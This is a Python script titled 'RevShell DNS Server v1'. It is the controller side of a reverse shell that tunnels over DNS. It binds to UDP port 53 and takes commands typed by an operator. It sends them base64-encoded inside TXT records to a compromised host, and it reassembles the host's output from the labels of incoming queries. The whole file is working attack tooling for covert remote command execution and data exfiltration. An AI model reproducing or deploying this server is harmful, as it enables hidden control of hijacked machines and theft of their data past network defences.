#!/usr/bin/env python
# RevShell DNS Server v1
import socket
import dnslib
import base64

PORT = 53
NXT_CMD = base64.b64encode("nxt")
PROMPT = 'SHELL >> '

def spawnShell(a, payload):
  out = base64.b64encode(raw_input(PROMPT))
  a.add_answer(*dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
  return a

def main():
  cmd_list = []  # Stores List of B64 Commands to be Executed
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('', PORT))

  print 'RevShell DNS Server v1.0'
  print 'Waiting for Request .... \n'

  try:
    data, addr = udps.recvfrom(1024)
    dnsD = dnslib.DNSRecord.parse(data)
    payload = dnsD.questions[0].qname.label[0]
    a = dnsD.reply()
    a = spawnShell(a, payload)
    udps.sendto(a.pack(), addr)
    while 1:
      data, addr = udps.recvfrom(1024)
      dnsD = dnslib.DNSRecord.parse(data)
      payload = dnsD.questions[0].qname.label[0]
      a = dnsD.reply()
      if (payload == NXT_CMD):
        try:
          # Check for '-'
          b64Cmd = ''.join(cmd_list)
          if b64Cmd[3] == '-':
            b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
          elif b64Cmd[1] == '-':
            b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
          print '{}'.format(base64.b64decode(b64Cmd))
        except:
          # Base64 Decode Failed.
          print '[ERROR]: Couldn\'t Read Result from Host!'
        cmd_list = []
        a = spawnShell(a, payload)
      else:
        cmd_list.append(payload)
      # Send back Response:
      udps.sendto(a.pack(), addr)

  except KeyboardInterrupt:
    print '\n-[ Connection Ended ]-\n'
    udps.close()


if __name__ == '__main__':
  main()
